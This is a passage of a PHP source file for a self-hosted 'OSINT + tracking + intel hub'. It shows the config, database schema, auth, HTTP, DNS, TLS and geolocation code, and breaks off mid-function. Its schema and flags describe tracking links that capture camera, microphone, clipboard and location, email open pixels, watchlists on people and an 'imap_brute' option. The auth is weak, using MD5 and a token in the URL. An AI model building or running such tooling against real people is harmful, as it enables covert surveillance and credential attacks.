<?php
/**
 * ============================================================
 *  tracking.php  v4.0  —  OSINT + tracking + intel hub
 *  single file · shared-host safe · MySQL/SQLite · REST + UI
 * ============================================================
 */
declare(strict_types=1);

/* ============================== CONFIG ============================== */
$CFG = [
    'db_dsn'  => 'mysql:host=sqlXXX.infinityfree.com;dbname=if0_XXXXXXXX_tracker;charset=utf8mb4',
    'db_user' => 'if0_XXXXXXXX',
    'db_pass' => 'YOUR_DB_PASSWORD',
    // 'db_dsn' => 'sqlite:' . __DIR__ . '/tracker.sqlite',

    'master_password' => 'change-me-now',
    'base_url' => '',
    'timezone' => 'UTC',

    'hibp_key'=>'', 'github_token'=>'', 'numverify_key'=>'', 'abstract_phone_key'=>'',
    'ipqs_key'=>'', 'hlr_key'=>'', 'abuseipdb_key'=>'',

    'messaging' => [
        'chain' => ['ntfy','http_mail','smtp','twilio_whatsapp','twilio_sms','telegram','discord','slack','webhook'],
        'smtp_host'=>'', 'smtp_port'=>587, 'smtp_user'=>'', 'smtp_pass'=>'', 'smtp_from'=>'',
        'http_mail_provider'=>'brevo', 'http_mail_key'=>'', 'http_mail_from'=>'',
        'twilio_sid'=>'', 'twilio_token'=>'', 'twilio_from'=>'', 'twilio_wa_from'=>'',
        'telegram_token'=>'', 'telegram_chat'=>'',
        'ntfy_server'=>'https://ntfy.sh', 'ntfy_topic'=>'', 'ntfy_token'=>'',
        'discord_webhook'=>'', 'slack_webhook'=>'', 'gotify_url'=>'', 'gotify_token'=>'',
        'pushover_token'=>'', 'pushover_user'=>'',
        'matrix_hs'=>'', 'matrix_token'=>'', 'matrix_room'=>'',
        'teams_webhook'=>'', 'gchat_webhook'=>'',
        'webhook'=>'', 'webhook_secret'=>'',
        'alert_to'=>'',
    ],

    'pool_concurrency' => 8,
    'pool_timeout'     => 8,
    'geo_provider'     => 'ipwho',
    'geo_ttl'          => 604800,
    'cache_ttl'        => 604800,
    'lazy_cron_minutes'=> 180,
    'rate_limit_per_hour' => 300,
    'retention_days'   => 180,
    'default_cc'       => '1',
    'debug'            => false,
];

const SCHEMA_VERSION = 'v4.0.1';
const APP_VER = '4.0.1';
const GIF_1PX = 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
const UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36';
const APP_UA = 'osint-hub/4.0';

/* ============================ BOOTSTRAP ============================ */
date_default_timezone_set($CFG['timezone']);
header_remove('X-Powered-By');
if ($CFG['debug']) { ini_set('display_errors','1'); error_reporting(E_ALL); }
if (!headers_sent()) header('X-Content-Type-Options: nosniff');

/* ========================= ENVIRONMENT ============================= */
function is_infinityfree(): bool {
    $h = strtolower(($_SERVER['HTTP_HOST'] ?? '') . ' ' . (gethostname() ?: ''));
    foreach (['infinityfree','rf.gd','epizy','byethost','000webhost'] as $x) if (str_contains($h,$x)) return true;
    return false;
}
function is_shared(): bool { return is_infinityfree() || !is_writable(sys_get_temp_dir() . '/'); }
function port_open(string $host, int $port, float $t = 3.0): bool {
    static $c = []; $k = $host . ':' . $port;
    if (isset($c[$k])) return $c[$k];
    $fp = @stream_socket_client("tcp://$host:$port", $en, $es, $t, STREAM_CLIENT_CONNECT);
    if ($fp) { @fclose($fp); return $c[$k] = true; }
    return $c[$k] = false;
}
function env_report(): array {
    return [
        'host'=>$_SERVER['HTTP_HOST'] ?? 'cli', 'php'=>PHP_VERSION, 'app'=>APP_VER,
        'shared_host'=>is_shared(), 'infinityfree'=>is_infinityfree(),
        'curl'=>function_exists('curl_init'), 'curl_multi'=>function_exists('curl_multi_init'),
        'pdo_mysql'=>extension_loaded('pdo_mysql'), 'pdo_sqlite'=>extension_loaded('pdo_sqlite'),
        'openssl'=>extension_loaded('openssl'),
        'dns_native'=>function_exists('dns_get_record'), 'getmxrr'=>function_exists('getmxrr'),
        'smtp_out_25'=>port_open('smtp.gmail.com',25), 'smtp_out_587'=>port_open('smtp.gmail.com',587),
        'https_out'=>port_open('dns.google',443), 'writable_dir'=>is_writable(__DIR__),
        'memory'=>ini_get('memory_limit'),
    ];
}

/* ============================== STORAGE ============================ */
function driver(): string { global $CFG; return str_starts_with($CFG['db_dsn'],'sqlite') ? 'sqlite' : 'mysql'; }
function db(): PDO {
    static $pdo = null;
    if ($pdo instanceof PDO) return $pdo;
    global $CFG;
    try {
        $pdo = new PDO($CFG['db_dsn'], $CFG['db_user'], $CFG['db_pass'], [
            PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE=>PDO::FETCH_ASSOC,
            PDO::ATTR_EMULATE_PREPARES=>false,
        ]);
    } catch (PDOException $e) {
        http_response_code(500);
        exit($CFG['debug'] ? 'DB: '.$e->getMessage() : 'Database connection failed. Check db_dsn/db_user/db_pass.');
    }
    if (driver()==='sqlite') { $pdo->exec('PRAGMA journal_mode=WAL'); $pdo->exec('PRAGMA busy_timeout=5000'); }
    ensure_schema($pdo);
    return $pdo;
}
function ensure_schema(PDO $pdo): void {
    try { $v = (string)$pdo->query("SELECT v FROM settings WHERE k='schema_version'")->fetchColumn(); }
    catch (Throwable $e) { $v = ''; }
    if ($v === SCHEMA_VERSION) return;
    install_schema($pdo);
    $pdo->prepare('REPLACE INTO settings (k,v) VALUES (?,?)')->execute(['schema_version', SCHEMA_VERSION]);
}
function install_schema(PDO $pdo): void {
    $d = driver();
    $pk  = $d==='sqlite' ? 'INTEGER PRIMARY KEY AUTOINCREMENT' : 'BIGINT AUTO_INCREMENT PRIMARY KEY';
    $txt = $d==='sqlite' ? 'TEXT' : 'VARCHAR(512)';
    $big = $d==='sqlite' ? 'TEXT' : 'LONGTEXT';
    $ts  = $d==='sqlite' ? 'TEXT' : 'DATETIME';
    $eng = $d==='sqlite' ? '' : ' ENGINE=InnoDB DEFAULT CHARSET=utf8mb4';
    $T = fn(string $n, string $cols) => $pdo->exec("CREATE TABLE IF NOT EXISTS $n ($cols)$eng");

    $T('settings',"k VARCHAR(64) PRIMARY KEY, v $big");
    $T('api_keys',"id $pk, k VARCHAR(64) UNIQUE, label VARCHAR(96), scope VARCHAR(16), created $ts,
        last_used $ts, calls INT DEFAULT 0, quota_hour INT DEFAULT 0, active TINYINT DEFAULT 1");
    $T('audit',"id $pk, ts $ts, actor VARCHAR(96), action VARCHAR(48), detail $txt, ip VARCHAR(45)");
    $T('events',"id $pk, ts $ts NOT NULL, kind VARCHAR(24) NOT NULL, visitor_id VARCHAR(32), session_id VARCHAR(32),
        ip VARCHAR(45), country VARCHAR(64), region VARCHAR(96), city VARCHAR(96), address $txt,
        lat REAL, lon REAL, accuracy REAL, geo_src VARCHAR(16),
        ua $txt, browser VARCHAR(64), browser_ver VARCHAR(24), os VARCHAR(64), os_ver VARCHAR(24),
        device VARCHAR(96), dev_type VARCHAR(16), is_bot TINYINT DEFAULT 0, is_proxy TINYINT DEFAULT 0,
        referrer $txt, url $txt, target $txt, link_id INT, utm $txt,
        email VARCHAR(190), phone VARCHAR(48), phone_e164 VARCHAR(24),
        anomaly VARCHAR(32), meta $big");
    $T('visitors',"visitor_id VARCHAR(32) PRIMARY KEY, first_seen $ts, last_seen $ts, hits INT DEFAULT 0,
        country VARCHAR(64), city VARCHAR(96), address $txt, browser VARCHAR(64), os VARCHAR(64),
        device VARCHAR(96), dev_type VARCHAR(16), fp VARCHAR(32)");
    $T('clicks',"id $pk, ts $ts, visitor_id VARCHAR(32), session_id VARCHAR(32), path VARCHAR(190),
        x INT, y INT, vw INT, vh INT, scroll INT, sel VARCHAR(190), tag VARCHAR(32), text VARCHAR(190)");
    $T('links',"id $pk, slug VARCHAR(32) UNIQUE, destination $txt NOT NULL, label VARCHAR(190), created $ts,
        expires_at $ts, max_clicks INT DEFAULT 0, clicks INT DEFAULT 0, one_time TINYINT DEFAULT 0,
        require_consent TINYINT DEFAULT 1, ask_location TINYINT DEFAULT 1, ask_camera TINYINT DEFAULT 1,
        ask_mic TINYINT DEFAULT 1, ask_notify TINYINT DEFAULT 1, ask_clip TINYINT DEFAULT 1,
        ask_sensors TINYINT DEFAULT 1, password_hash VARCHAR(255), webhook $txt, webhook_secret VARCHAR(64),
        rules $big, splits $big, utm $txt, cloak TINYINT DEFAULT 0, active TINYINT DEFAULT 1");
    $T('captures',"id $pk, event_id INT, kind VARCHAR(16), mime VARCHAR(48), data $big, bytes INT, ts $ts");
    $T('emails',"id $pk, slug VARCHAR(32) UNIQUE, recipient VARCHAR(190), subject VARCHAR(190), created $ts,
        opens INT DEFAULT 0, first_open $ts, last_open $ts");
    $T('addresses',"id $pk, query $txt, display_name $txt, street $txt, city VARCHAR(190), region VARCHAR(190),
        postcode VARCHAR(32), country VARCHAR(64), country_code VARCHAR(4), lat REAL, lon REAL,
        osm_type VARCHAR(24), osm_id VARCHAR(32), raw $big, ts $ts");
    $T('watchlist',"id $pk, kind VARCHAR(16), value VARCHAR(190) UNIQUE, note VARCHAR(190), channel VARCHAR(24),
        created $ts, last_run $ts, last_hash VARCHAR(32), runs INT DEFAULT 0, changes INT DEFAULT 0, active TINYINT DEFAULT 1");
    $T('phone_snapshots',"id $pk, e164 VARCHAR(24), ts $ts, carrier VARCHAR(96), line_type VARCHAR(24),
        country VARCHAR(8), mccmnc VARCHAR(16), active VARCHAR(16), signature VARCHAR(32)");
    $T('alerts',"id $pk, ts $ts, kind VARCHAR(32), severity VARCHAR(16), subject VARCHAR(190),
        message $big, entity VARCHAR(190), sent TINYINT DEFAULT 0, channel VARCHAR(24)");
    $T('sends',"id $pk, ts $ts, channel VARCHAR(24), to_addr VARCHAR(190), body $big, status VARCHAR(24), response $txt");
    $T('ratelimit',"k VARCHAR(96) PRIMARY KEY, n INT, window_start $ts");
    $T('email_osint',"email VARCHAR(190) PRIMARY KEY, score INT, level VARCHAR(16), json $big, ts $ts");
    $T('phone_osint',"e164 VARCHAR(24) PRIMARY KEY, json $big, ts $ts");
    $T('ip_osint',"ip VARCHAR(45) PRIMARY KEY, json $big, ts $ts");
    $T('user_osint',"username VARCHAR(96) PRIMARY KEY, json $big, ts $ts");
    $T('profiles',"pid VARCHAR(32) PRIMARY KEY, json $big, ts $ts");
    $T('cache',"k VARCHAR(190) PRIMARY KEY, v $big, exp $ts, born $ts");
    $T('jobs',"id $pk, kind VARCHAR(32), payload $big, status VARCHAR(16), priority INT DEFAULT 5,
        attempts INT DEFAULT 0, result $big, error $txt, created $ts, started $ts, finished $ts, notify VARCHAR(190)");

    $idx = ['events'=>['ts','kind','visitor_id','email','phone_e164','geo_src','anomaly'],
        'clicks'=>['ts','path'], 'jobs'=>['status','created'], 'phone_snapshots'=>['e164'],
        'alerts'=>['ts'], 'watchlist'=>['kind'], 'addresses'=>['query'], 'visitors'=>['last_seen']];
    foreach ($idx as $tbl=>$cols) foreach ($cols as $c) {
        $sql = "CREATE INDEX IF NOT EXISTS ix_{$tbl}_{$c} ON {$tbl}({$c})";
        if ($d==='mysql') $sql = str_replace(' IF NOT EXISTS','',$sql);
        try { $pdo->exec($sql); } catch (Throwable $e) {}
    }
}

/* ===================== SETTINGS + FEATURE FLAGS ==================== */
const DEFAULTS = [
    'tracking_enabled'=>'1','osint_enabled'=>'1','collect_geo'=>'1','collect_camera'=>'1',
    'collect_mic'=>'1','collect_clipboard'=>'1','collect_sensors'=>'1','collect_webrtc'=>'1',
    'collect_heatmap'=>'1','consent_required'=>'1','smtp_verify'=>'1','imap_brute'=>'1',
    'ddg_enabled'=>'1','geocode_enabled'=>'1','doh_fallback'=>'1','lazy_cron'=>'1',
    'jobs_enabled'=>'1','bot_enabled'=>'1','dnsbl_enabled'=>'1','tor_check'=>'1','ports_enabled'=>'1',
    'pool_concurrency'=>'8','cache_ttl'=>'604800','retention_days'=>'180','rate_limit_per_hour'=>'300',
    'master_password_hash'=>'','schema_version'=>'',
];
function setting(string $k, ?string $def = null): ?string {
    static $all = null;
    if ($all === null) {
        $all = DEFAULTS;
        try { foreach (db()->query('SELECT k,v FROM settings') as $r) $all[$r['k']] = (string)$r['v']; } catch (Throwable $e) {}
    }
    return $all[$k] ?? $def ?? (DEFAULTS[$k] ?? null);
}
function flag(string $k): bool { return setting($k) === '1'; }
function set_setting(string $k, string $v): void { db()->prepare('REPLACE INTO settings (k,v) VALUES (?,?)')->execute([$k,$v]); }
function setting_int(string $k, int $def = 0): int { return (int)(setting($k) ?? $def); }

/* ============================== AUDIT ============================== */
function audit(string $action, string $detail = '', ?string $actor = null): void {
    try {
        db()->prepare('INSERT INTO audit (ts,actor,action,detail,ip) VALUES (?,?,?,?,?)')
            ->execute([gmdate('Y-m-d H:i:s'), $actor ?? (current_actor() ?? 'anon'), $action, substr($detail,0,500), client_ip()]);
    } catch (Throwable $e) {}
}

/* ============================== AUTH =============================== */
function start_session(): void {
    if (session_status() !== PHP_SESSION_ACTIVE)
        @session_start(['cookie_httponly'=>true,'cookie_samesite'=>'Lax',
            'cookie_secure'=>(!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS']!=='off')]);
}
function current_actor(): ?string { start_session(); return $_SESSION['actor'] ?? null; }
function is_master(): bool { start_session(); return !empty($_SESSION['master']); }
function check_api_key(?string $key): ?array {
    if (!$key) return null;
    $st = db()->prepare('SELECT * FROM api_keys WHERE k = ? AND active = 1'); $st->execute([$key]);
    $r = $st->fetch(); if (!$r) return null;
    if ((int)$r['quota_hour'] > 0 && !rate_limit('key:'.$r['k'], (int)$r['quota_hour'])) return $r + ['_throttled'=>1];
    db()->prepare('UPDATE api_keys SET calls = calls + 1, last_used = ? WHERE id = ?')->execute([gmdate('Y-m-d H:i:s'), $r['id']]);
    return $r;
}
function require_auth(string $need = 'admin'): void {
    global $CFG;
    $key = (string)($_GET['key'] ?? $_POST['key'] ?? ($_SERVER['HTTP_X_API_KEY'] ?? ''));
    if ($k = check_api_key($key)) {
        if (!empty($k['_throttled'])) { jout(['error'=>'key quota exceeded'], 429); exit; }
        if ($need === 'admin' && $k['scope'] !== 'admin') { jout(['error'=>'key lacks admin scope'], 403); exit; }
        start_session(); $_SESSION['actor'] = 'key:'.$k['label'];
        return;
    }
    if (is_master()) return;
    if (hash_equals(setting('master_password_hash') ?: md5($CFG['master_password']), md5((string)($_GET['token'] ?? '')))) return;
    render_login(); exit;
}
function rate_limit(string $bucket = 'osint', ?int $limit = null): bool {
    $limit ??= setting_int('rate_limit_per_hour', 300);
    if ($limit <= 0) return true;
    $k = substr($bucket.':'.md5($bucket==='osint' ? client_ip() : $bucket), 0, 96);
    $pdo = db(); $st = $pdo->prepare('SELECT * FROM ratelimit WHERE k = ?'); $st->execute([$k]);
    $r = $st->fetch(); $now = time();
    if (!$r || strtotime((string)$r['window_start']) < $now - 3600) {
        $pdo->prepare('REPLACE INTO ratelimit (k,n,window_start) VALUES (?,1,?)')->execute([$k, gmdate('Y-m-d H:i:s')]);
        return true;
    }
    if ((int)$r['n'] >= $limit) return false;
    $pdo->prepare('UPDATE ratelimit SET n = n + 1 WHERE k = ?')->execute([$k]);
    return true;
}

/* ============================== HELPERS ============================ */
function base_url(): string {
    global $CFG;
    if ($CFG['base_url']) return rtrim($CFG['base_url'], '?');
    $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS']!=='off') || ($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https';
    return ($https?'https://':'http://') . ($_SERVER['HTTP_HOST'] ?? 'localhost') . ($_SERVER['SCRIPT_NAME'] ?? '/tracking.php');
}
function url_for(array $p): string { $p['i'] = 1; return base_url() . '?' . http_build_query($p); }
function client_ip(): string {
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_TRUE_CLIENT_IP','HTTP_X_REAL_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $k)
        if (!empty($_SERVER[$k])) { $ip = trim(explode(',',(string)$_SERVER[$k])[0]); if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip; }
    return '0.0.0.0';
}
function visitor_id(): string {
    if (!empty($_COOKIE['_oid']) && preg_match('/^[a-f0-9]{32}$/',(string)$_COOKIE['_oid'])) return (string)$_COOKIE['_oid'];
    $id = bin2hex(random_bytes(16));
    @setcookie('_oid',$id,['expires'=>time()+63072000,'path'=>'/','httponly'=>true,'samesite'=>'Lax',
        'secure'=>(!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS']!=='off')]);
    return $id;
}
function sid(): string {
    if (!empty($_COOKIE['_osid']) && preg_match('/^[a-f0-9]{16}$/',(string)$_COOKIE['_osid'])) return (string)$_COOKIE['_osid'];
    $id = bin2hex(random_bytes(8));
    @setcookie('_osid',$id,['expires'=>time()+1800,'path'=>'/','httponly'=>true,'samesite'=>'Lax']);
    return $id;
}
function slug(int $n = 7): string { $a='abcdefghijkmnpqrstuvwxyz23456789'; $s=''; for($i=0;$i<$n;$i++) $s.=$a[random_int(0,strlen($a)-1)]; return $s; }
function h($s): string { return htmlspecialchars((string)$s, ENT_QUOTES); }
function jout($d, int $c = 200): void {
    http_response_code($c); header('Content-Type: application/json; charset=utf-8'); header('Cache-Control: no-store');
    header('Access-Control-Allow-Origin: *'); header('Access-Control-Allow-Headers: Content-Type,X-API-Key');
    echo json_encode($d, JSON_UNESCAPED_SLASHES|JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT);
}
function emit_gif(): void { header('Content-Type: image/gif'); header('Cache-Control: no-store,no-cache,must-revalidate,max-age=0'); echo base64_decode(GIF_1PX); }
function norm_domain(string $d): string {
    $d = strtolower(trim($d));
    $d = preg_replace('~^[a-z]+://~','',$d);
    $d = preg_replace('~[/?#].*$~','',$d);
    return preg_replace('~^www\.~','',$d) ?? $d;
}

/* ============================== HTTP =============================== */
function http(string $url, array $o = []): array {
    $method = $o['method'] ?? 'GET';
    $timeout = (int)($o['timeout'] ?? 8);
    $headers = $o['headers'] ?? [];
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        $opts = [CURLOPT_RETURNTRANSFER=>true, CURLOPT_FOLLOWLOCATION=>$o['follow'] ?? true,
            CURLOPT_MAXREDIRS=>$o['maxredirs'] ?? 4, CURLOPT_TIMEOUT=>$timeout,
            CURLOPT_CONNECTTIMEOUT=>min(6,$timeout), CURLOPT_USERAGENT=>$o['ua'] ?? UA,
            CURLOPT_ENCODING=>'', CURLOPT_SSL_VERIFYPEER=>$o['verify'] ?? true];
        if ($headers) $opts[CURLOPT_HTTPHEADER] = $headers;
        if ($method !== 'GET') $opts[CURLOPT_CUSTOMREQUEST] = $method;
        if (isset($o['body'])) $opts[CURLOPT_POSTFIELDS] = $o['body'];
        if (!empty($o['nobody'])) $opts[CURLOPT_NOBODY] = true;
        curl_setopt_array($ch, $opts);
        $resp = curl_exec($ch);
        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $err = curl_error($ch); curl_close($ch);
        return ['status'=>$code, 'body'=>is_string($resp)?$resp:'', 'error'=>$err];
    }
    $ctx = stream_context_create(['http'=>['method'=>$method,'timeout'=>$timeout,'user_agent'=>$o['ua'] ?? UA,
        'header'=>implode("\r\n",$headers),'content'=>$o['body'] ?? null,'ignore_errors'=>true]]);
    $resp = @file_get_contents($url,false,$ctx);
    return ['status'=>$resp===false?0:200, 'body'=>(string)$resp, 'error'=>$resp===false?'stream':''];
}
function http_json(string $url, array $o = []): ?array {
    $r = http($url,$o);
    if ($r['status'] < 200 || $r['status'] >= 400) return null;
    $j = json_decode($r['body'],true);
    return is_array($j) ? $j : null;
}
function http_headers(string $url, int $timeout = 12): array {
    if (!function_exists('curl_init')) return ['status'=>0,'headers'=>[],'body'=>''];
    $ch = curl_init($url);
    curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_HEADER=>true,
        CURLOPT_TIMEOUT=>$timeout,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>4,
        CURLOPT_USERAGENT=>UA,CURLOPT_SSL_VERIFYPEER=>false]);
    $raw = (string)curl_exec($ch); $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $hs = (int)curl_getinfo($ch, CURLINFO_HEADER_SIZE); curl_close($ch);
    $out = [];
    foreach (preg_split('/\r?\n/', substr($raw,0,$hs)) as $line)
        if (str_contains($line,':')) { [$k,$v] = explode(':',$line,2); $out[strtolower(trim($k))] = trim($v); }
    return ['status'=>$code,'headers'=>$out,'body'=>substr($raw,$hs,40000)];
}
function gather(array $jobs): array {
    global $CFG;
    if (!$jobs) return [];
    if (!function_exists('curl_multi_init')) {
        $out = []; foreach ($jobs as $k=>$j) { $r = http($j['url'],$j); $out[$k] = ['status'=>$r['status'],'body'=>$r['body'],'error'=>$r['error']]; }
        return $out;
    }
    $max = max(2, min(24, (int)setting('pool_concurrency','8')));
    $out = []; $queue = $jobs;
    while ($queue) {
        $batch = array_splice($queue, 0, $max);
        $mh = curl_multi_init();
        if (defined('CURLMOPT_MAX_TOTAL_CONNECTIONS')) curl_multi_setopt($mh, CURLMOPT_MAX_TOTAL_CONNECTIONS, $max);
        $hs = [];
        foreach ($batch as $k=>$j) {
            $ch = curl_init($j['url']);
            $o = [CURLOPT_RETURNTRANSFER=>true, CURLOPT_FOLLOWLOCATION=>$j['follow'] ?? true,
                CURLOPT_MAXREDIRS=>4, CURLOPT_TIMEOUT=>(int)($j['timeout'] ?? $CFG['pool_timeout']),
                CURLOPT_CONNECTTIMEOUT=>6, CURLOPT_USERAGENT=>$j['ua'] ?? APP_UA,
                CURLOPT_ENCODING=>'', CURLOPT_SSL_VERIFYPEER=>true, CURLOPT_TCP_KEEPALIVE=>1];
            if (!empty($j['headers'])) $o[CURLOPT_HTTPHEADER] = $j['headers'];
            if (!empty($j['nobody'])) $o[CURLOPT_NOBODY] = true;
            if (!empty($j['method']) && $j['method'] !== 'GET') $o[CURLOPT_CUSTOMREQUEST] = $j['method'];
            if (isset($j['body'])) $o[CURLOPT_POSTFIELDS] = $j['body'];
            curl_setopt_array($ch,$o); curl_multi_add_handle($mh,$ch); $hs[$k] = $ch;
        }
        $running = null;
        do { curl_multi_exec($mh,$running); if ($running && curl_multi_select($mh,0.15) === -1) usleep(15000); } while ($running > 0);
        foreach ($hs as $k=>$ch) {
            $out[$k] = ['status'=>(int)curl_getinfo($ch,CURLINFO_HTTP_CODE),'body'=>(string)curl_multi_getcontent($ch),'error'=>curl_error($ch)];
            curl_multi_remove_handle($mh,$ch); curl_close($ch);
        }
        curl_multi_close($mh);
    }
    return $out;
}
function sign_body(string $body, string $secret): string { return 'sha256='.hash_hmac('sha256', $body, $secret); }

/* ============================== CACHE ============================== */
function cache_get(string $k) {
    try {
        $st = db()->prepare('SELECT v,exp FROM cache WHERE k = ?'); $st->execute([$k]);
        if (!($r = $st->fetch())) return null;
        if ($r['exp'] !== null && strtotime((string)$r['exp']) < time()) return null;
        return json_decode((string)$r['v'], true);
    } catch (Throwable $e) { return null; }
}
function cache_set(string $k, $v, ?int $ttl = null): void {
    $ttl ??= setting_int('cache_ttl', 604800);
    try {
        db()->prepare('REPLACE INTO cache (k,v,exp,born) VALUES (?,?,?,?)')
            ->execute([substr($k,0,190), json_encode($v, JSON_UNESCAPED_SLASHES),
                gmdate('Y-m-d H:i:s', time()+$ttl), gmdate('Y-m-d H:i:s')]);
    } catch (Throwable $e) {}
}
function cached(string $key, callable $fn, ?int $ttl = null) {
    $hit = cache_get($key); if ($hit !== null) return $hit;
    $val = $fn(); if ($val !== null) cache_set($key,$val,$ttl);
    return $val;
}

/* =============================== DNS =============================== */
function dns_do(string $name, string $type): array {
    if (!flag('doh_fallback') && !function_exists('dns_get_record')) return [];
    return cached('doh:'.$type.':'.$name, function () use ($name,$type) {
        $r = http('https://dns.google/resolve?name='.urlencode($name).'&type='.$type,
            ['timeout'=>6,'headers'=>['Accept: application/dns-json']]);
        if ($r['status'] !== 200) return [];
        return json_decode($r['body'],true)['Answer'] ?? [];
    }, 3600) ?? [];
}
function dns_mx(string $domain): array {
    $out = [];
    if (function_exists('dns_get_record'))
        foreach ((array)@dns_get_record($domain,DNS_MX) as $r) if (!empty($r['target'])) $out[] = ['host'=>rtrim((string)$r['target'],'.'),'pri'=>(int)($r['pri'] ?? 0)];
    if (!$out && function_exists('getmxrr')) { $hs=[];$ws=[]; if (@getmxrr($domain,$hs,$ws)) foreach ($hs as $i=>$x) $out[] = ['host'=>rtrim($x,'.'),'pri'=>(int)($ws[$i] ?? 0)]; }
    if (!$out) foreach (dns_do($domain,'MX') as $a) if (($a['type'] ?? 0) === 15) { $p = preg_split('/\s+/',trim((string)$a['data'])); $out[] = ['host'=>rtrim(end($p),'.'),'pri'=>(int)($p[0] ?? 0)]; }
    usort($out, fn($a,$b) => $a['pri'] <=> $b['pri']);
    return $out;
}
function dns_txt(string $name): array {
    $out = [];
    if (function_exists('dns_get_record')) foreach ((array)@dns_get_record($name,DNS_TXT) as $r) if (!empty($r['txt'])) $out[] = $r['txt'];
    if (!$out) foreach (dns_do($name,'TXT') as $a) if (($a['type'] ?? 0) === 16) $out[] = trim((string)$a['data'],'"');
    return $out;
}
function dns_ns(string $domain): array {
    $out = [];
    if (function_exists('dns_get_record')) $out = array_column((array)@dns_get_record($domain,DNS_NS),'target');
    if (!$out) foreach (dns_do($domain,'NS') as $a) if (($a['type'] ?? 0) === 2) $out[] = rtrim((string)$a['data'],'.');
    return array_values(array_filter($out));
}
function dns_a(string $domain): array {
    $out = [];
    if (function_exists('dns_get_record')) $out = array_column((array)@dns_get_record($domain,DNS_A),'ip');
    if (!$out) foreach (dns_do($domain,'A') as $a) if (($a['type'] ?? 0) === 1) $out[] = $a['data'];
    return array_values(array_filter($out));
}
function dns_records(string $domain): array {
    $map = ['A'=>1,'AAAA'=>28,'CNAME'=>5,'MX'=>15,'TXT'=>16,'NS'=>2,'SOA'=>6,'CAA'=>257,'SRV'=>33,'PTR'=>12,'DS'=>43,'DNSKEY'=>48,'TLSA'=>52];
    $out = [];
    foreach ($map as $t=>$code) {
        $rows = [];
        if (function_exists('dns_get_record') && defined('DNS_'.$t))
            foreach ((array)@dns_get_record($domain, constant('DNS_'.$t)) as $r) { unset($r['class'],$r['ttl']); $rows[] = $r; }
        if (!$rows) foreach (dns_do($domain,$t) as $a) if (($a['type'] ?? 0) === $code) $rows[] = ['data'=>$a['data']];
        if ($rows) $out[$t] = $rows;
    }
    return $out;
}

/* ============================== TLS ================================ */
function tls_info(string $host, int $port = 443): array {
    return cached('tls:'.$host.':'.$port, function () use ($host,$port) {
        if (!extension_loaded('openssl')) return ['ok'=>false,'error'=>'no openssl'];
        $ctx = stream_context_create(['ssl'=>['capture_peer_cert'=>true,'capture_peer_cert_chain'=>true,
            'verify_peer'=>false,'verify_peer_name'=>false,'SNI_enabled'=>true,'peer_name'=>$host]]);
        $fp = @stream_socket_client("ssl://$host:$port", $en, $es, 10, STREAM_CLIENT_CONNECT, $ctx);
        if (!$fp) return ['ok'=>false,'error'=>$es ?: 'connect failed'];
        $p = stream_context_get_params($fp); @fclose($fp);
        $cert = $p['options']['ssl']['peer_certificate'] ?? null;
        if (!$cert) return ['ok'=>false,'error'=>'no certificate'];
        $parsed = openssl_x509_parse($cert, false);
        $chain = $p['options']['ssl']['peer_certificate_chain'] ?? [];
        $san = [];
        foreach (preg_split('/,\s*/', (string)($parsed['extensions']['subjectAltName'] ?? '')) as $s)
            if ($s && str_starts_with($s,'DNS:')) $san[] = substr($s,4);
        $cn = $parsed['subject']['CN'] ?? ($san[0] ?? null);
        $now = time();
        $days = (int)round((($parsed['validTo_time_t'] ?? $now) - $now) / 86400);
        $grade = 'A'; $issues = [];
        if ($days < 0) { $grade = 'F'; $issues[] = 'expired'; }
        elseif ($days < 14) { $grade = 'B'; $issues[] = 'expires in '.$days.'d'; }
        if (($parsed['signatureTypeSN'] ?? '') === 'RSA-SHA1') { $issues[] = 'sha1 signature'; $grade = 'C'; }
        if ($cn && !in_array($host, $san, true)) $issues[] = 'host not in SAN list';
        return ['ok'=>true,'host'=>$host,'cn'=>$cn,'issuer'=>$parsed['issuer']['O'] ?? ($parsed['issuer']['CN'] ?? null),
            'san'=>$san,'not_before'=>gmdate('c',$parsed['validFrom_time_t'] ?? 0),
            'not_after'=>gmdate('c',$parsed['validTo_time_t'] ?? 0),'days_left'=>$days,
            'chain_len'=>count($chain),'grade'=>$grade,'issues'=>$issues,'sig'=>$parsed['signatureTypeSN'] ?? null];
    }, 86400);
}

/* ============================== GEO ================================ */
function geo_ip(string $ip): array {
    if (setting('geo_provider','ipwho') === 'none' || $ip === '0.0.0.0') return [];
    if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE|FILTER_FLAG_NO_RES_RANGE)) return [];
    $c = cache_get('geo:'.$ip); if ($c) return $c;
    $out = [];
    $j = http_json('https://ipwho.is/'.urlencode($ip), ['timeout'=>5]);
    if ($j && ($j['success'] ?? false)) {
        $out = ['country'=>$j['country'] ?? '','country_code'=>$j['country_code'] ?? '','region'=>$j['region'] ?? '',
            'city'=>$j['city'] ?? '','lat'=>$j['latitude'] ?? null,'lon'=>$j['longitude'] ?? null,
            'geo_src'=>'ip','isp'=>$j['connection']['isp'] ?? null,'asn'=>$j['connection']['asn'] ?? null,
            'timezone'=>$j['timezone']['id'] ?? null];
    } else {
        $j = http_json('http://ip-api.com/json/'.urlencode($ip).'?fields=status,country,countryCode,regionName,city,lat,lon,isp,as,org,proxy,hosting,timezone,reverse');
        if ($j && ($j['status'] ?? '') === 'success')
            $out = ['country'=>$j['country'] ?? '','country_code'=>$j['countryCode'] ?? '','region'=>$j['regionName'] ?? '',
